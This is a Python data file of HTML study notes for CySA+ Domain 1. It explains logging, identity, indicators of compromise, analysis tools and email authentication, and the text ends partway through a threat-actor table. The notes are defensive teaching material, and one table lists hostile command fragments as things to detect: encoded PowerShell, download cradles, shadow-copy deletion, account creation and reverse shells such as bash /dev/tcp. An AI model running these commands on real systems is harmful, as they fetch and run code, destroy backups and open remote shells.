# CySA+ Notebook, Domain 1: Security Operations.
# Original prose written against the CS0-003 objectives. Nothing here is copied
# from course transcripts, decks, published study guides or commercial practice material.
# Each topic: id, o (objective), t (title), q (drill search term), h (HTML body).
T = "<blockquote><span class=\"tag\">Exam trap</span>{}</blockquote>"

D1 = [
# ---------------------------------------------------------------- 1.1
dict(id="log-ingestion", o="1.1", t="Log ingestion, time sync and logging levels", q="log", h="""
<p>A SIEM is only as good as what it receives. <strong>Log ingestion</strong> is getting events from hosts, network devices, cloud services and applications into one place, parsed into fields (normalized) so a single query can span all of them.</p>
<p><strong>Time synchronization</strong> is the quiet prerequisite. If a firewall is four minutes ahead of the domain controller, a correlation rule that says &ldquo;logon followed by outbound connection within 60 seconds&rdquo; never fires, and your incident timeline puts effects before causes. Point every source at the same NTP hierarchy and store timestamps in UTC; convert to local time only for display.</p>
<p><strong>Logging levels</strong> trade detail for volume. Syslog severities run 0&ndash;7:</p>
<div class="tblwrap"><table><tr><th>Level</th><th>Name</th><th>Typical use</th></tr>
<tr><td>0</td><td>Emergency</td><td>System unusable</td></tr>
<tr><td>1</td><td>Alert</td><td>Act immediately</td></tr>
<tr><td>2</td><td>Critical</td><td>Critical condition</td></tr>
<tr><td>3</td><td>Error</td><td>Error condition</td></tr>
<tr><td>4</td><td>Warning</td><td>Something may go wrong</td></tr>
<tr><td>5</td><td>Notice</td><td>Normal but significant</td></tr>
<tr><td>6</td><td>Informational</td><td>Routine messages</td></tr>
<tr><td>7</td><td>Debug</td><td>Developer detail, very noisy</td></tr></table></div>
<p>Lower number means more severe. Setting a device to level 4 records 0 through 4 and drops 5&ndash;7.</p>
""" + T.format("When a question says events from two systems &ldquo;don&rsquo;t line up&rdquo; or a correlation rule never fires, the answer is almost always time synchronization (NTP), not the rule logic.") + """
<p>Raising everything to debug is not the fix for missing evidence: it floods storage and the SIEM licence, and the signal drowns. Raise verbosity on the specific source you need, for a set period.</p>"""),

dict(id="os-concepts", o="1.1", t="OS concepts: Registry, file locations, processes, hardening", q="registry", h="""
<p><strong>Windows Registry.</strong> A hierarchical configuration database. The hives you will see in questions:</p>
<ul><li><strong>HKLM</strong> (HKEY_LOCAL_MACHINE): machine-wide settings, services, installed software.</li>
<li><strong>HKCU</strong> (HKEY_CURRENT_USER): the logged-on user&rsquo;s settings.</li>
<li><strong>HKU</strong>, <strong>HKCR</strong>, <strong>HKCC</strong>: all users, file associations, current hardware profile.</li></ul>
<p>Persistence lives in the <strong>Run</strong> and <strong>RunOnce</strong> keys under both HKLM and HKCU (<code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>) and in service entries under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. A new value there pointing into a user&rsquo;s AppData or Temp folder is a classic indicator.</p>
<p><strong>Configuration file locations.</strong> Linux keeps system configuration under <code>/etc</code> (<code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/ssh/sshd_config</code>, <code>/etc/crontab</code>) and logs under <code>/var/log</code> (<code>auth.log</code> or <code>secure</code>, <code>syslog</code> or <code>messages</code>). Windows keeps event logs in <code>C:\\Windows\\System32\\winevt\\Logs</code> and the hosts file in <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code>. Temp directories (<code>/tmp</code>, <code>%TEMP%</code>) are world- or user-writable, which is why malware stages there.</p>
<p><strong>System processes.</strong> Know what normal looks like so abnormal stands out:</p>
<div class="tblwrap"><table><tr><th>Process</th><th>Normal</th><th>Suspicious</th></tr>
<tr><td>svchost.exe</td><td>Many copies, parent services.exe, runs from System32</td><td>Parent is anything else, or runs from another folder</td></tr>
<tr><td>lsass.exe</td><td>Exactly one, parent wininit.exe</td><td>A second copy, or a process reading its memory (credential dumping)</td></tr>
<tr><td>explorer.exe</td><td>One per logged-on user</td><td>Spawning cmd or PowerShell with encoded arguments</td></tr>
<tr><td>Office apps</td><td>Open documents</td><td>Spawning cmd.exe, powershell.exe or wscript.exe</td></tr></table></div>
<p><strong>System hardening.</strong> Reduce attack surface: remove unneeded services and software, close unused ports, apply a configuration baseline (CIS benchmarks, Group Policy), enforce least privilege, patch, and turn on logging. <strong>Hardware architecture</strong> matters because protections such as TPM, Secure Boot and memory-protection features (DEP, ASLR) depend on it.</p>
<p>Hardening applies at every layer: <strong>application</strong> (remove sample content, disable unused features, patch), <strong>operating system</strong>, <strong>server</strong>, <strong>endpoint</strong>, <strong>database</strong> (remove default accounts, least-privilege service accounts, encrypt sensitive columns) and <strong>network</strong> devices (disable unused ports and services, use SSH instead of Telnet, change default credentials). It runs for the whole life of a system, from build to decommission, and standards such as PCI DSS and HIPAA require it.</p>
""" + T.format("A misspelled lookalike in the right folder (svch0st.exe, lsas.exe) or the right name in the wrong folder are both process indicators. Check name, path and parent together.")),

dict(id="infrastructure", o="1.1", t="Serverless, virtualization and containers", q="container", h="""
<div class="tblwrap"><table><tr><th></th><th>Virtual machine</th><th>Container</th><th>Serverless</th></tr>
<tr><td>Isolation unit</td><td>Whole guest OS on a hypervisor</td><td>Process sharing the host kernel</td><td>A function the provider runs on demand</td></tr>
<tr><td>You manage</td><td>Guest OS and everything above</td><td>Image, app, orchestration</td><td>Code and its permissions</td></tr>
<tr><td>Key risk</td><td>VM escape, sprawl, unpatched guests</td><td>Vulnerable base images, privileged containers, shared-kernel escape</td><td>Over-permissive roles, insecure triggers, little host visibility</td></tr>
<tr><td>Forensics</td><td>Snapshot the VM</td><td>Capture before the container is destroyed</td><td>Rely on provider logs; there is no host to image</td></tr></table></div>
<p><strong>Type 1</strong> hypervisors run on bare metal (ESXi, Hyper-V); <strong>Type 2</strong> run on a host OS (VirtualBox, VMware Workstation). Containers are ephemeral by design, so evidence disappears when they are rescheduled; send their logs off the host as they are produced.</p>
""" + T.format("Serverless removes the server you would harden, not the security job. The customer still owns code flaws and IAM permissions under the shared responsibility model.")),

dict(id="network-architecture", o="1.1", t="Network architecture: segmentation, zero trust, SASE, SDN", q="zero trust", h="""
<p><strong>On-premises</strong> means you own the hardware and all of its security; <strong>cloud</strong> shifts some layers to the provider; <strong>hybrid</strong> mixes both and adds the link between them as attack surface.</p>
<p><strong>Network segmentation</strong> splits the network into zones (VLANs, subnets, firewall rules, a screened subnet for public services) so a compromise in one zone cannot freely reach another. It limits lateral movement and narrows audit scope, for example keeping cardholder systems in their own segment for PCI DSS.</p>
<p><strong>Zero trust</strong>: never trust because of network location; verify every request using identity, device health and context, and grant least privilege per session. Core pieces are a policy decision point and a policy enforcement point, plus <strong>microsegmentation</strong>.</p>
<p><strong>SASE</strong> (secure access service edge) delivers networking and security as one cloud service near the user: SD-WAN plus SWG, CASB, ZTNA and firewall-as-a-service. CompTIA&rsquo;s list prints it as &ldquo;secure access secure edge&rdquo;; the industry term is service edge.</p>
<p><strong>SDN</strong> (software-defined networking) separates the control plane (decides where traffic goes, in a central controller) from the data plane (forwards packets). It lets you change segmentation by policy in software, and makes the controller a high-value target.</p>
""" + T.format("&ldquo;Inside the perimeter, so trusted&rdquo; is exactly what zero trust rejects. If an answer grants access because the user is on the internal network, it is not zero trust.")),

dict(id="iam", o="1.1", t="Identity: MFA, SSO, federation, PAM, passwordless, CASB", q="federation", h="""
<ul><li><strong>MFA</strong> combines factors from different categories: something you know, have, are (plus somewhere you are, something you do). Two passwords is still one factor.</li>
<li><strong>SSO</strong> lets one authentication unlock many apps in the same organization. Convenience plus one strong login; also one credential that unlocks everything if stolen.</li>
<li><strong>Federation</strong> extends SSO across organizations through trust between an identity provider (IdP) and service providers. <strong>SAML</strong> carries XML assertions, common for enterprise web SSO; <strong>OAuth</strong> is authorization (delegated access to APIs); <strong>OpenID Connect</strong> adds authentication on top of OAuth.</li>
<li><strong>PAM</strong> controls admin accounts: vaulted credentials, just-in-time elevation, session recording, password rotation.</li>
<li><strong>Passwordless</strong> uses FIDO2/WebAuthn keys, platform biometrics or authenticator push instead of a shared secret, which removes phishing and credential-stuffing of passwords.</li>
<li><strong>CASB</strong> sits between users and cloud services to give visibility into shadow IT, enforce policy, and apply DLP to SaaS. Can work by API or inline proxy.</li></ul>
<p><strong>Factor categories</strong>: knowledge (password, PIN), possession (phone, smart card, hardware key), inherence (fingerprint, face), plus location and behavior. <strong>Two-step verification</strong> just means two checks in sequence, and both can be the same category (a password, then a security question). <strong>Two-factor authentication</strong> requires two <em>different</em> categories. Every 2FA login is two-step; not every two-step login is 2FA.</p>
<p><strong>How SSO works</strong>: the user signs in once to an identity provider (IdP). The IdP issues a signed token or assertion; each application (service provider) trusts the IdP&rsquo;s signature instead of checking the password itself. Stealing that session token is therefore as good as stealing the login, which is why token lifetime and revocation matter.</p>
<div class="tblwrap"><table><tr><th>Strength</th><th>Examples</th><th>Weakness</th></tr>
<tr><td>Weakest</td><td>Password only</td><td>Phished, guessed, reused</td></tr>
<tr><td>Fair</td><td>Password + SMS or voice code</td><td>SIM swap, interception, real-time phishing</td></tr>
<tr><td>Better</td><td>Password + authenticator push or OTP app, or hardware OTP token</td><td>Push fatigue (MFA bombing), real-time phishing proxies</td></tr>
<tr><td>Best</td><td><strong>Phishing-resistant</strong> passwordless: FIDO2/WebAuthn security keys and passkeys, Windows Hello for Business, certificate-based authentication</td><td>Cost, enrollment and recovery processes</td></tr></table></div>
<p>Phishing-resistant methods bind the login cryptographically to the real site, so a lookalike page can&rsquo;t relay it.</p>
""" + T.format("OAuth on its own is authorization, not authentication. If the question is about proving who a user is across organizations, think SAML or OpenID Connect.")),

dict(id="encryption", o="1.1", t="PKI and SSL/TLS inspection", q="pki", h="""
<p><strong>PKI</strong> binds public keys to identities with certificates signed by a certificate authority (CA). Root CA (kept offline) signs intermediates, which sign end-entity certificates. Revocation is checked with a CRL (a published list) or OCSP (a live query; OCSP stapling lets the server supply the signed answer).</p>
<p><strong>SSL/TLS inspection</strong> decrypts traffic at a proxy or NGFW, inspects it, and re-encrypts it. It works by having clients trust the inspection device&rsquo;s own CA, which issues certificates on the fly. Without it, malware riding HTTPS is invisible to network tools.</p>
<ul><li>Exempt categories such as banking and health sites for privacy and legal reasons.</li>
<li>Certificate pinning in some apps breaks under inspection.</li>
<li>The inspection device now holds plaintext of everything, so it must be hardened and logged.</li></ul>
""" + T.format("&ldquo;SSL inspection&rdquo; is the objective&rsquo;s wording, but SSL itself is deprecated. The protocol actually being inspected is TLS.")),

dict(id="sensitive-data", o="1.1", t="Sensitive data protection: DLP, PII, CHD", q="dlp", h="""
<p><strong>DLP</strong> finds sensitive data and stops it leaving by policy. It inspects data in three states: <strong>at rest</strong> (discovery scans of shares and databases), <strong>in motion</strong> (network and email gateways), and <strong>in use</strong> (endpoint agents controlling copy, print, USB). Detection uses pattern matching (regex for card or ID numbers), exact data matching, fingerprints of documents, and classification labels.</p>
<p><strong>PII</strong> is anything that identifies a person alone or in combination: name with date of birth, government ID numbers, biometrics. Privacy laws (GDPR, state laws, HIPAA for health data) govern it.</p>
<p><strong>CHD</strong> (cardholder data) is the primary account number plus cardholder name, expiry and service code. PCI DSS governs it, and <strong>sensitive authentication data</strong> (full track data, CVV2, PIN) must never be stored after authorization.</p>
<p>A practical DLP program runs in four steps: <strong>know</strong> your data (discover and classify it), <strong>protect</strong> it (encryption, access restrictions, labels), <strong>prevent loss</strong> (policies that block or warn on risky sharing), and <strong>govern</strong> it (retain and delete according to policy and regulation). DLP guards against insiders as much as outside attackers: most leaks are accidental oversharing.</p>
""" + T.format("Encryption protects data if it is stolen; DLP stops it being sent. A question about blocking an employee from emailing card numbers out wants DLP.")),

# ---------------------------------------------------------------- 1.2
dict(id="network-indicators", o="1.2", t="Network indicators", q="beacon", h="""
<div class="tblwrap"><table><tr><th>Indicator</th><th>What it looks like</th><th>Usual meaning</th></tr>
<tr><td>Beaconing</td><td>Small, regular outbound connections to one destination at a fixed interval, often with jitter</td><td>Malware checking in with C2</td></tr>
<tr><td>Bandwidth consumption</td><td>Sustained high usage, especially outbound or off-hours</td><td>Exfiltration, crypto-mining, DoS participation</td></tr>
<tr><td>Irregular peer-to-peer</td><td>Workstations talking directly to each other over SMB, RDP or WinRM</td><td>Lateral movement or worm spread</td></tr>
<tr><td>Rogue device</td><td>Unknown MAC or DHCP lease, new wireless AP</td><td>Unauthorized hardware, attacker implant</td></tr>
<tr><td>Scans/sweeps</td><td>One source touching many ports (scan) or many hosts on one port (sweep)</td><td>Reconnaissance</td></tr>
<tr><td>Traffic spikes</td><td>Sudden departure from baseline volume</td><td>DoS, exfiltration, misconfiguration</td></tr>
<tr><td>Unexpected ports</td><td>Service on a non-standard port, or a well-known port carrying the wrong protocol</td><td>Evasion, tunneling, backdoors</td></tr></table></div>
<p>Everything here depends on a <strong>baseline</strong>. You can&rsquo;t call traffic unusual without knowing what usual is.</p>
""" + T.format("Regularity is the giveaway for beaconing, not volume. A beacon can be tiny. Large transfers point to exfiltration instead.")),

dict(id="host-indicators", o="1.2", t="Host indicators", q="scheduled task", h="""
<ul><li><strong>Processor, memory, drive consumption</strong>: sustained CPU with no user activity suggests a miner; a filling disk suggests staging for exfiltration or a log flood; memory growth can mean injection.</li>
<li><strong>Unauthorized software</strong> and <strong>malicious processes</strong>: compare against an allow list and known-good inventory.</li>
<li><strong>Unauthorized changes and privileges</strong>: new local admins, added group memberships, services set to auto-start.</li>
<li><strong>Abnormal OS process behavior</strong>: wrong parent, wrong path, injected threads, a system process with network connections it never normally makes.</li>
<li><strong>File system anomalies</strong>: mass renames with new extensions (ransomware), executables in Temp, timestamps altered (timestomping).</li>
<li><strong>Registry anomalies</strong>: new Run-key values, new services, disabled security settings.</li>
<li><strong>Unauthorized scheduled tasks</strong>: Windows Task Scheduler (<code>schtasks</code>, Event ID 4698 when one is created) or Linux <code>cron</code> entries that relaunch malware.</li>
<li><strong>Data exfiltration</strong>: archives (zip, rar, 7z) created in odd locations followed by large uploads.</li></ul>
"""),

dict(id="app-indicators", o="1.2", t="Application indicators", q="new account", h="""
<ul><li><strong>Anomalous activity</strong>: requests at volumes, times or sequences the app never sees normally.</li>
<li><strong>Introduction of new accounts</strong>: an admin account created outside the provisioning process is a strong persistence indicator. Check who created it and from where.</li>
<li><strong>Unexpected output</strong>: error pages full of stack traces or SQL errors suggest injection probing; extra data in responses suggests a data leak.</li>
<li><strong>Unexpected outbound</strong>: a web or database server initiating connections to the internet is rarely legitimate (reverse shells, SSRF, exfiltration).</li>
<li><strong>Service interruption</strong>: crashes and restarts can be DoS or exploitation of a memory bug.</li>
<li><strong>Application logs</strong>: web access logs (status codes, user agents, URIs), auth logs, and app-specific audit trails are where these show up.</li></ul>
""" + T.format("Servers mostly receive connections. A server that starts making outbound connections, especially to raw IPs or odd ports, is a stronger signal than the same traffic from a workstation.")),

dict(id="ioc-checklist", o="1.2", t="Common IoCs: the classic checklist", q="ioc", h="""
<p>Training material often gives a longer list of everyday indicators than the objective wording. Each one is only meaningful against a baseline.</p>
<div class="tblwrap"><table><tr><th>Indicator</th><th>Why it matters</th></tr>
<tr><td>Unusual outbound traffic</td><td>The clearest sign data or control traffic is leaving: check volume, destination and time of day.</td></tr>
<tr><td>Privileged account anomalies</td><td>Admin accounts touching systems or data they never use, or used at odd hours, suggest a compromised or misused account.</td></tr>
<tr><td>Geographic irregularities</td><td>Logons or connections from countries the organization has no business in; at the user level this becomes impossible travel.</td></tr>
<tr><td>Login red flags</td><td>Many failed attempts across accounts (spraying) or many against one account, especially when a success follows.</td></tr>
<tr><td>Swells in database read volume</td><td>A sudden jump in rows read is a typical sign of bulk extraction before exfiltration.</td></tr>
<tr><td>Unusual HTTP response sizes</td><td>Responses far larger than normal for a page can mean an injection is dumping data.</td></tr>
<tr><td>Many requests for the same file</td><td>Repeated attempts on one resource suggest someone probing or retrying a theft.</td></tr>
<tr><td>Mismatched port and application traffic</td><td>A protocol on a port it doesn&rsquo;t belong on (HTTP over 53, SSH over 443) points to tunneling or evasion.</td></tr>
<tr><td>Suspicious registry or system file changes</td><td>Persistence and tampering by malware.</td></tr>
<tr><td>DNS request anomalies</td><td>High volumes, long random-looking names (DGA), many NXDOMAIN replies or heavy TXT queries can mean C2 or DNS tunneling.</td></tr></table></div>
""" + T.format("An IoC is evidence after the fact. An IoA (indicator of attack) describes behavior while the attack is still under way. If the question stresses real time and intent, IoA is the better answer.")),

dict(id="other-indicators", o="1.2", t="Social engineering and obfuscated links", q="obfuscated", h="""
<p>Social engineering indicators show up in people and email rather than logs: urgency, authority, requests to bypass process, mismatched sender details.</p>
<p><strong>Obfuscated links</strong> hide the real destination: URL shorteners, lookalike domains (rn for m, Cyrillic letters), <code>@</code> tricks (<code>https://bank.com@evil.net</code> goes to evil.net), long subdomains (<code>bank.com.login.evil.net</code>), percent-encoding, and redirect chains through trusted sites. Read the registered domain, which is the part just before the top-level domain.</p>
"""),

# ---------------------------------------------------------------- 1.3
dict(id="packet-capture", o="1.3", t="Packet capture: Wireshark and tcpdump", q="tcpdump", h="""
<p>Both capture packets with libpcap-style filters; Wireshark adds a GUI with protocol dissectors, stream reassembly and statistics, tcpdump runs anywhere on the command line.</p>
<p><strong>Two filter languages, and the exam mixes them up on purpose:</strong></p>
<div class="tblwrap"><table><tr><th></th><th>Capture filter (BPF)</th><th>Wireshark display filter</th></tr>
<tr><td>Where</td><td>tcpdump, Wireshark capture options</td><td>Wireshark filter bar, after capture</td></tr>
<tr><td>Host</td><td><code>host 10.1.1.5</code></td><td><code>ip.addr == 10.1.1.5</code></td></tr>
<tr><td>Port</td><td><code>port 443</code>, <code>tcp port 22</code></td><td><code>tcp.port == 443</code></td></tr>
<tr><td>Protocol</td><td><code>icmp</code>, <code>udp</code></td><td><code>dns</code>, <code>http.request</code></td></tr>
<tr><td>Combine</td><td><code>and</code>, <code>or</code>, <code>not</code></td><td><code>&amp;&amp;</code>, <code>||</code>, <code>!</code> (words work too)</td></tr></table></div>
<p><strong>tcpdump flags to know</strong>: <code>-i eth0</code> interface, <code>-n</code> don&rsquo;t resolve names, <code>-nn</code> don&rsquo;t resolve names or ports, <code>-w file.pcap</code> write raw packets, <code>-r file.pcap</code> read a capture, <code>-c 100</code> stop after 100 packets, <code>-A</code> print payload as ASCII, <code>-X</code> hex and ASCII, <code>-s 0</code> full packet length.</p>
<p>Example: <code>tcpdump -i eth0 -nn -w out.pcap host 10.1.1.5 and port 445</code> captures SMB traffic to and from one host into a file.</p>
<p>Useful Wireshark moves: <strong>Follow TCP Stream</strong> to read a conversation; <strong>Statistics &gt; Conversations</strong> to find top talkers; <strong>Export Objects &gt; HTTP</strong> to pull transferred files out of a capture.</p>
""" + T.format("<code>ip.addr ==</code> is a Wireshark display filter and will not work in tcpdump; <code>host</code> is BPF and will not work in the display filter bar. Match the syntax to the tool named in the question.")),

dict(id="siem-soar", o="1.3", t="SIEM vs SOAR", q="soar", h="""
<div class="tblwrap"><table><tr><th></th><th>SIEM</th><th>SOAR</th></tr>
<tr><td>Job</td><td>Collect, normalize, correlate and alert on logs; store for search and retention</td><td>Act on alerts: run playbooks, enrich, open tickets, contain</td></tr>
<tr><td>Output</td><td>Alerts, dashboards, search results</td><td>Automated actions and case management</td></tr>
<tr><td>Key word</td><td>Correlation</td><td>Orchestration and automation</td></tr>
<tr><td>Examples</td><td>Splunk, ELK/Elastic, Graylog, QRadar, Sentinel</td><td>Splunk SOAR, Cortex XSOAR, Sentinel playbooks</td></tr></table></div>
<p><strong>Correlation</strong> links separate events into one story: five failed logons, then a success, then a new admin account, from the same source, in ten minutes. Each event alone is noise; the sequence is an alert.</p>
<p><strong>SOAR playbook example</strong>: phishing report arrives &rarr; extract URLs and attachments &rarr; check reputation and detonate in sandbox &rarr; if malicious, delete from all mailboxes, block the domain, open a ticket &rarr; analyst reviews.</p>
""" + T.format("If the question is about reducing analyst workload or response time by automatically taking steps, the answer is SOAR. If it is about seeing related events from many sources together, it is SIEM.")),

dict(id="edr", o="1.3", t="Endpoint security: EDR (and XDR)", q="edr", h="""
<p><strong>EDR</strong> agents record process starts, command lines, file writes, registry changes and network connections on each endpoint, ship them to a console, detect by behavior rather than only signatures, and let you respond remotely: isolate the host from the network, kill a process, quarantine a file, pull artifacts, run a live-response shell.</p>
<p>Antivirus asks &ldquo;is this file known bad?&rdquo; EDR asks &ldquo;is this behavior bad?&rdquo;, for example Word spawning PowerShell that downloads and runs a script.</p>
<p><strong>XDR</strong> extends the same idea across endpoints, network, email, identity and cloud, correlating them in one platform.</p>
""" + T.format("&ldquo;Isolate the host but keep it powered on and reachable by the security console&rdquo; is an EDR network-containment feature. It preserves memory evidence that pulling the plug would destroy.")),

dict(id="reputation", o="1.3", t="DNS and IP reputation: WHOIS, AbuseIPDB", q="whois", h="""
<p><strong>WHOIS</strong> returns registration data for a domain or IP block: registrar, creation and expiry dates, name servers, and (often redacted) registrant contacts. A domain registered three days ago that is sending your users invoices is suspicious. For IPs, regional registries (ARIN, RIPE, APNIC) show which organization owns the range.</p>
<p><strong>AbuseIPDB</strong> is a community database where people report abusive IP addresses (scanning, brute force, spam). You get a confidence-of-abuse score, report count and categories. High scores mean many independent reports; zero means unreported, not necessarily clean.</p>
<p>Other reputation sources: VirusTotal (domains and IPs too), passive DNS history, Cisco Talos, threat-intel platforms.</p>
""" + T.format("WHOIS tells you who registered something and when. It does not say whether it is malicious; that is the reputation service&rsquo;s job.")),

dict(id="file-analysis", o="1.3", t="File analysis: strings, hashing, VirusTotal, sandboxes", q="strings", h="""
<p><strong>Hashing</strong> gives a file a fingerprint. Same hash means identical file; one changed bit changes the whole hash. Use SHA-256 (MD5 and SHA-1 still appear for lookups but have known collisions). Commands: <code>sha256sum file</code> on Linux, <code>Get-FileHash file</code> (SHA-256 by default) in PowerShell, <code>certutil -hashfile file SHA256</code> in cmd.</p>
<p><strong>strings</strong> pulls printable text out of a binary without running it: URLs, IPs, registry paths, commands, error messages, sometimes the C2 domain. Packed or encrypted malware shows little, which is itself a clue.</p>
<p><strong>VirusTotal</strong> checks a hash, file, URL, domain or IP against dozens of engines. Search by hash first; uploading a file shares it with VirusTotal&rsquo;s community, which can tip off an attacker or leak your data.</p>
<p><strong>Sandboxing</strong> detonates the sample in an isolated, instrumented VM and reports behavior: files dropped, registry changes, network calls, screenshots. <strong>Cuckoo</strong> is open source and self-hosted; <strong>Joe Sandbox</strong> is commercial (cloud or on-prem). Some malware detects VMs and stays quiet, so a clean sandbox run is not proof of innocence.</p>
<div class="tblwrap"><table><tr><th>Need</th><th>Tool</th></tr>
<tr><td>Is this exact file known?</td><td>Hash, then VirusTotal lookup</td></tr>
<tr><td>What text or IOCs are inside?</td><td>strings</td></tr>
<tr><td>What does it do when it runs?</td><td>Sandbox</td></tr>
<tr><td>Has the file changed?</td><td>Compare hashes (or FIM)</td></tr></table></div>
""" + T.format("Static analysis (strings, hashing) never runs the file; dynamic analysis (sandbox) does. If the question says &ldquo;without executing&rdquo;, the sandbox is wrong.")),

dict(id="pattern-commands", o="1.3", t="Pattern recognition and suspicious commands", q="powershell", h="""
<p><strong>C2 patterns</strong>: beaconing at fixed intervals, long DNS queries with random-looking subdomains (DNS tunneling), HTTP POSTs to an odd path from a non-browser user agent, connections to newly registered or algorithmically generated domains (DGA).</p>
<p><strong>Commands that should get your attention:</strong></p>
<div class="tblwrap"><table><tr><th>Command fragment</th><th>Why it matters</th></tr>
<tr><td><code>powershell -enc</code> / <code>-EncodedCommand</code></td><td>Base64 payload hiding what runs</td></tr>
<tr><td><code>-nop -w hidden -ep bypass</code></td><td>No profile, hidden window, execution policy ignored</td></tr>
<tr><td><code>IEX (New-Object Net.WebClient).DownloadString(...)</code></td><td>Download and run in memory, nothing on disk</td></tr>
<tr><td><code>certutil -urlcache -f http://...</code></td><td>Built-in tool abused to download</td></tr>
<tr><td><code>bitsadmin /transfer</code></td><td>Built-in downloader</td></tr>
<tr><td><code>vssadmin delete shadows /all /quiet</code></td><td>Destroying backups, typical before ransomware</td></tr>
<tr><td><code>net user x /add</code>, <code>net localgroup administrators x /add</code></td><td>Creating and elevating an account</td></tr>
<tr><td><code>schtasks /create</code>, <code>crontab -e</code></td><td>Persistence</td></tr>
<tr><td><code>nc -e /bin/sh</code>, <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code></td><td>Reverse shell</td></tr>
<tr><td><code>wget|curl ... | sh</code>, <code>chmod +x /tmp/x</code></td><td>Download and execute on Linux</td></tr></table></div>
<p>Using built-in tools like these is called <strong>living off the land</strong>: nothing new is installed, so signature AV misses it, and behavior (EDR) and command-line logging (Event ID 4688 with command line, PowerShell Script Block Logging 4104) catch it.</p>
<p><strong>Local recon commands</strong> on a live host: <code>netstat -ano</code> (connections with owning PID), <code>tasklist /svc</code>, <code>ipconfig /displaydns</code> (resolver cache), <code>ps aux</code>, <code>ss -tulpn</code> or <code>lsof -i</code> on Linux.</p>
"""),

dict(id="email-analysis", o="1.3", t="Email analysis: headers, SPF, DKIM, DMARC, links", q="dmarc", h="""
<p><strong>Reading headers</strong>: <code>Received:</code> lines are added by each server, newest at the top, so read bottom-up to trace the path from the origin. Compare <code>From:</code> (what the user sees) with <code>Return-Path:</code> (envelope sender, where bounces go) and <code>Reply-To:</code>. A mismatch, especially a Reply-To at a free webmail domain, is a phishing tell.</p>
<div class="tblwrap"><table><tr><th></th><th>What it checks</th><th>Where it lives</th></tr>
<tr><td><strong>SPF</strong></td><td>Is the sending server&rsquo;s IP allowed to send for the envelope (Return-Path) domain?</td><td>DNS TXT record listing allowed senders, ending <code>-all</code> (fail) or <code>~all</code> (softfail)</td></tr>
<tr><td><strong>DKIM</strong></td><td>Was the message signed by the domain, and is it unaltered since signing?</td><td>Signature in the header; public key in DNS at <code>selector._domainkey.domain</code></td></tr>
<tr><td><strong>DMARC</strong></td><td>Does SPF or DKIM pass <em>and align</em> with the visible From domain? What to do if not?</td><td>DNS TXT at <code>_dmarc.domain</code>, policy <code>p=none</code>, <code>quarantine</code> or <code>reject</code>, plus reporting addresses</td></tr></table></div>
<p>DMARC is what closes the gap: SPF alone checks the envelope domain, which the user never sees. DMARC ties the result to the From address and tells receivers what to do and where to report.</p>
<p><strong>Impersonation</strong>: display-name spoofing (&ldquo;CEO Name&rdquo; &lt;random@gmail.com&gt;), lookalike domains, and compromised real accounts (which pass all three checks). <strong>Embedded links</strong>: hover to compare link text with the real href, and check redirects in a sandbox or URL scanner rather than clicking.</p>
""" + T.format("Passing SPF, DKIM and DMARC proves the mail came from that domain&rsquo;s servers, not that it is safe. A compromised legitimate mailbox passes all three.")),

dict(id="user-behavior", o="1.3", t="User behavior analysis and impossible travel", q="impossible travel", h="""
<p><strong>UEBA</strong> (user and entity behavior analytics) builds a baseline per user and device and flags deviations: logons at unusual hours, first-time access to a sensitive share, a spike in downloads, privilege use the account never had.</p>
<p><strong>Impossible travel</strong>: two successful logons from locations too far apart for the time between them, such as New York then Singapore 40 minutes later. Usually means stolen credentials. Check first for VPN egress points and cloud proxies, which make a user appear somewhere they are not.</p>
<p><strong>Abnormal account activity</strong>: many failed logons then a success (brute force or spraying), one password tried against many accounts (password spraying), service accounts logging on interactively, dormant accounts waking up.</p>
"""),

dict(id="scripting", o="1.3", t="Reading JSON, XML, Python, PowerShell, shell and regex", q="regex", h="""
<p>The exam wants you to read these, not write them.</p>
<ul><li><strong>JSON</strong>: <code>{"key": "value", "list": [1, 2]}</code>. Curly braces for objects, square brackets for arrays, keys always in double quotes. Most SIEM and API output is JSON.</li>
<li><strong>XML</strong>: <code>&lt;event&gt;&lt;user&gt;bob&lt;/user&gt;&lt;/event&gt;</code>. Tags open and close; attributes sit inside tags. Windows event logs export as XML; SAML assertions are XML.</li>
<li><strong>Python</strong>: indentation defines blocks; <code>import requests</code>, <code>for line in open(f):</code>, <code>re.search()</code>. Common for parsing logs and calling APIs.</li>
<li><strong>PowerShell</strong>: Verb-Noun cmdlets (<code>Get-Process</code>, <code>Get-WinEvent</code>, <code>Get-FileHash</code>), pipelines pass objects, variables start with <code>$</code>.</li>
<li><strong>Shell (bash)</strong>: <code>grep</code>, <code>awk</code>, <code>cut</code>, <code>sort | uniq -c | sort -nr</code> to count and rank, <code>#!/bin/bash</code> shebang.</li></ul>
<p><strong>Regex essentials</strong>:</p>
<div class="tblwrap"><table><tr><th>Token</th><th>Means</th></tr>
<tr><td><code>.</code></td><td>Any one character</td></tr>
<tr><td><code>*</code> / <code>+</code> / <code>?</code></td><td>0 or more / 1 or more / 0 or 1 of the previous item</td></tr>
<tr><td><code>\\d</code> <code>\\w</code> <code>\\s</code></td><td>Digit / word character / whitespace</td></tr>
<tr><td><code>[a-z]</code> <code>[^0-9]</code></td><td>Any in the set / any not in the set</td></tr>
<tr><td><code>{3}</code> <code>{1,3}</code></td><td>Exactly 3 / between 1 and 3</td></tr>
<tr><td><code>^</code> <code>$</code></td><td>Start / end of line</td></tr>
<tr><td><code>\\.</code></td><td>A literal dot</td></tr>
<tr><td><code>( )</code> <code>|</code></td><td>Group / or</td></tr></table></div>
<p>An IPv4 address is commonly matched with <code>\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b</code>, which also accepts 999.999.999.999, so treat it as a rough filter.</p>
"""),

# ---------------------------------------------------------------- 1.4
dict(id="threat-actors", o="1.4", t="Threat actors", q="threat actor", h="""
<div class="tblwrap"><table><tr><th>Actor</th><th>Motive</th><th>Resources and skill</th><th>Tell</th></tr>
<tr><td>Nation-state</td><td>Espionage, disruption, geopolitical advantage</td><td>Highest; custom tools, zero-days</td><td>Long dwell, stealth, strategic targets</td></tr>
<tr><td>APT</td><td>Long-term access to steal or spy</td><td>High</td><td>Persistence over months; usually state-backed or state-adjacent</td></tr>
<tr><td>Organized crime</td><td>Money</td><td>High, run like a business</td><td>Ransomware, fraud, data for sale</td></tr>
